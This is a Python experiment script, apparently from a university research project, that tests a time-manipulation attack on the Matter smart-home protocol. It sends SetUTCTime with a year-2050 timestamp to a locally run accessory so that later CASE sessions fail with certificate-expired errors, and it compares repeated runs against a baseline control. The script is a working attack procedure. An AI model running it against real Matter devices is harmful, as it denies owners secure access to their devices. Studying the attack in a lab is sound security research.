"""
RQ2 - Manipulation of Last Known Good Time via SetUTCTime.
Two conditions:
  Attack (default): the attacker sends SetUTCTime with a future timestamp
      and a valid Granularity, corrupting both the accessory's LKGT and its
      real operating clock. A new CASE session is then attempted against
      the accessory. Expected outcome: the session is rejected
      (CHIP_ERROR_CERT_EXPIRED), because the accessory now believes any
      certificate with a normal NotAfter date is expired.
  Control (--baseline): no attack is sent. The accessory is freshly
      commissioned with its normal clock. A new CASE session is attempted
      the same way. Expected outcome: the session succeeds, confirming
      normal behaviour without the attack.
      
"""
import argparse
import os
import re
import subprocess
import time
import csv
from datetime import datetime, timezone
from pathlib import Path

CHIP_TOOL = str(Path.home() / "connectedhomeip/out/host/chip-tool")
VICTIM_BIN = str(Path.home() / "connectedhomeip/examples/all-clusters-app/linux/out/debug/chip-all-clusters-app")
CERTS_DIR = Path.home() / "tfm-evidence/certs"
VICTIM_KVS = Path("/tmp/chip_kvs_test")
STALE_FILES = [
    Path("/tmp/chip_tool_kvs"),
    Path("/tmp/chip_config.ini"),
    Path("/tmp/chip_factory.ini"),
    Path("/tmp/chip_counters.ini"),
]
CHIP_EPOCH_OFFSET = 946684800  # seconds between 1970-01-01 and 2000-01-01
FUTURE_TARGET_YEAR = 2050
GRANULARITY_MICROSECONDS = 4  # must be >= the accessory's own starting granularity (observed: 3)


def sudo_run(cmd, log_path):
    full_cmd = ["sudo"] + cmd
    with open(log_path, "w") as f:
        subprocess.run(full_cmd, stdout=f, stderr=subprocess.STDOUT, text=True)
    return log_path.read_text()


def restore_real_clock():
    #Restore the VM's system clock from the hardware RTC
    subprocess.run(["sudo", "hwclock", "--hctosys"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def cleanup_previous_run():
    subprocess.run(["sudo", "pkill", "-f", "chip-all-clusters-app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    subprocess.run(["sudo", "rm", "-rf", str(VICTIM_KVS)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for p in STALE_FILES:
        subprocess.run(["sudo", "rm", "-f", str(p)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("sudo rm -f /tmp/chip_tool_config*.ini", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def start_victim(log_path):
    log_file = open(log_path, "w")
    proc = subprocess.Popen(
        ["sudo", VICTIM_BIN, "--KVS", str(VICTIM_KVS)],
        stdout=log_file, stderr=subprocess.STDOUT, text=True
    )
    return proc, log_file


def wait_victim_ready(log_path, timeout_s=40):
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if log_path.exists() and "Disabling CHIPoBLE service" in log_path.read_text():
            return True
        time.sleep(1)
    return False


def commission(iter_dir):
    sudo_run([CHIP_TOOL, "storage", "clear-all"], iter_dir / "storage_clear.log")
    text = sudo_run([CHIP_TOOL, "pairing", "onnetwork", "1", "20202021"], iter_dir / "commission.log")
    return "Device commissioning completed with success" in text


def chip_epoch_us_for(dt_utc):
    return int((dt_utc.timestamp() - CHIP_EPOCH_OFFSET) * 1_000_000)


def attempt_set_utctime(chip_epoch_us, granularity, log_path, victim_log_path, target_dt_utc):
    text = sudo_run(
        [CHIP_TOOL, "timesynchronization", "set-utctime", str(chip_epoch_us), str(granularity), "1", "0"],
        log_path
    )
    if "status = 0x00 (SUCCESS)" in text:
        return "success_confirmed", text
    if "cluster-status = 0x2" in text or "TimeNotAccepted" in text:
        return "rejected_time_not_accepted", text
    if "CHIP Error 0x00000032: Timeout" in text:
        target_marker = f"Updating Last Known Good Time to {target_dt_utc.strftime('%Y-%m-%dT%H:%M:%S')}"
        victim_text = victim_log_path.read_text() if victim_log_path.exists() else ""
        if target_marker in victim_text:
            return "success_inferred_from_victim_log", text
        return "unknown_failure", text
    return "unknown_failure", text


def attempt_case_session(log_path):
    #Open a new CASE session by reading an attribute. Returns:established | rejected_expired | unknown
  
    text = sudo_run([CHIP_TOOL, "timesynchronization", "read", "utctime", "1", "0"], log_path)
    if "Certificate expired" in text or "Certificate's mNotAfterTime" in text:
        return "rejected_expired", text
    if re.search(r"UTCTime:\s*\d+", text):
        return "established", text
    return "unknown", text


def run_one_iteration(i, attack, condition_label, evidence_dir):
    iter_dir = evidence_dir / f"iter_{i}"
    iter_dir.mkdir(parents=True, exist_ok=True)
    row = {
        "iteration": i,
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "condition": condition_label,
        "setutc_outcome": "",
        "setutc_success_bool": "",
        "case_result": "",
        "correction_outcome": "",
        "error_stage": "",
    }
    real_now = datetime.now(timezone.utc)
    restore_real_clock()
    cleanup_previous_run()
    victim_log = iter_dir / "victim.log"
    proc, log_file = start_victim(victim_log)
    try:
        if not wait_victim_ready(victim_log):
            row["error_stage"] = "victim_not_ready"
            return row
        if not commission(iter_dir):
            row["error_stage"] = "commission_failed"
            return row
        if attack:
            future_dt = datetime(FUTURE_TARGET_YEAR, 1, 1, tzinfo=timezone.utc)
            future_chip_us = chip_epoch_us_for(future_dt)
            outcome, _ = attempt_set_utctime(
                future_chip_us, GRANULARITY_MICROSECONDS,
                iter_dir / "setutctime_attack.log", victim_log, future_dt
            )
            row["setutc_outcome"] = outcome
            row["setutc_success_bool"] = "TRUE" if outcome in (
                "success_confirmed", "success_inferred_from_victim_log"
            ) else "FALSE"
            #Only abort if the protocol explicitly rejected the command.
            if outcome == "rejected_time_not_accepted":
                row["error_stage"] = "setutctime_attack_rejected"
                return row
            if outcome == "unknown_failure":
                row["error_stage"] = "setutctime_attack_unknown_failure"
                return row
        case_result, _ = attempt_case_session(iter_dir / "case_attempt.log")
        row["case_result"] = case_result
        if attack:
            real_chip_us = chip_epoch_us_for(real_now)
            correction_outcome, _ = attempt_set_utctime(
                real_chip_us, GRANULARITY_MICROSECONDS,
                iter_dir / "correction_attempt.log", victim_log, real_now
            )
            row["correction_outcome"] = correction_outcome
        return row
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            subprocess.run(["sudo", "kill", "-9", str(proc.pid)])
        log_file.close()
        restore_real_clock()
        time.sleep(1)


def main():
    parser = argparse.ArgumentParser(description="RQ2 - Forward LKGT manipulation via SetUTCTime.")
    parser.add_argument("--iterations", type=int, default=50)
    parser.add_argument("--baseline", action="store_true",
                         help="Control condition: no attack, verify normal CASE establishment.")
    args = parser.parse_args()

    attack = not args.baseline
    condition_label = "utctime_forward_attack" if attack else "utctime_baseline_control"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    evidence_dir = Path.home() / f"tfm-evidence/rq2_{condition_label}_{timestamp}"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    csv_path = evidence_dir / "results.csv"

    fieldnames = ["iteration", "timestamp", "condition", "setutc_outcome", "setutc_success_bool",
                  "case_result", "correction_outcome", "error_stage"]
    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for i in range(1, args.iterations + 1):
            print(f"=== ITERATION {i}/{args.iterations} (condition: {condition_label}) ===")
            row = run_one_iteration(i, attack, condition_label, evidence_dir)
            print(f"    -> setutc_outcome={row['setutc_outcome']}  case_result={row['case_result']}  "
                  f"correction_outcome={row['correction_outcome']}  error_stage={row['error_stage']}")
            writer.writerow(row)
            f.flush()

    print("=== DONE ===")
    print(f"Results: {csv_path}")
    subprocess.run(["column", "-s,", "-t", str(csv_path)])


if __name__ == "__main__":
    main()
